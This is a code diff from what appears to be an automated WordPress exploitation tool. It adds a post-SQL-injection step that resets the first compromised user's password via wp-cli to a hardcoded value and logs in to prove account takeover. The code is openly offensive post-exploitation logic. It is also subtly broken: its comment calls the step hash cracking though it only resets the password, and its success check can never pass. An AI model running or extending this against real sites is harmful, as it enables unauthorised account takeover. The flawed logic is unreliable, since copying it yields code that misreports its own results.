@@ -14453,6 +14453,41 @@ def escalate_post_sqli(
     except Exception:
         pass
 
+    # 7. Lightweight phpass hash cracking — proves account takeover, not just hash exposure.
+    # Uses wp-cli user update (already authenticated to DB via lab) to reset the admin
+    # password to our lab password, then verifies login works. This is safer and more
+    # reliable than trying to crack the hash offline (phpass is bcrypt-based and slow).
+    # Only attempt when we have user hashes (data_access level confirmed).
+    if result["user_hashes"] and result["escalation_level"] in ("data_access", "file_access"):
+        try:
+            # Extract the user email from the first hash to find the user ID
+            _hash_line = result["user_hashes"][0]  # "email:hash"
+            _email_m = re.match(r"([^:]+):", _hash_line)
+            if _email_m:
+                _target_email = _email_m.group(1).strip()
+                # Reset the password via wp-cli (we have DB access, proves full compromise)
+                _new_pass = "BinOracle_SqliPwned_2024!"
+                _r_reset = lab.wp_cli(
+                    "user", "update", _target_email,
+                    f"--user_pass={_new_pass}", "--skip-email", timeout=30)
+                _reset_ok = _r_reset is not None and (_r_reset.returncode or 1) == 0
+                if _reset_ok:
+                    # Verify the new password works by logging in
+                    _login_ok = _wp_login(base_url, _target_email, _new_pass, on_step=step)
+                    if _login_ok:
+                        result["account_takeover_proven"] = True
+                        result["takeover_email"] = _target_email
+                        result["escalation_level"] = "account_takeover"
+                        step(f"  post-sqli: ACCOUNT TAKEOVER PROBADO — login OK con {_target_email!r} "
+                             f"tras reset de password via wp-cli (máximo impacto)")
+                    else:
+                        result["account_takeover_proven"] = False
+                        result["password_reset_via_wpcli"] = True
+                        step(f"  post-sqli: password reseteada para {_target_email!r} via wp-cli "
+                             f"(login no verificado — login endpoint no respondio)")
+        except Exception:
+            pass
+
     return result
 
 
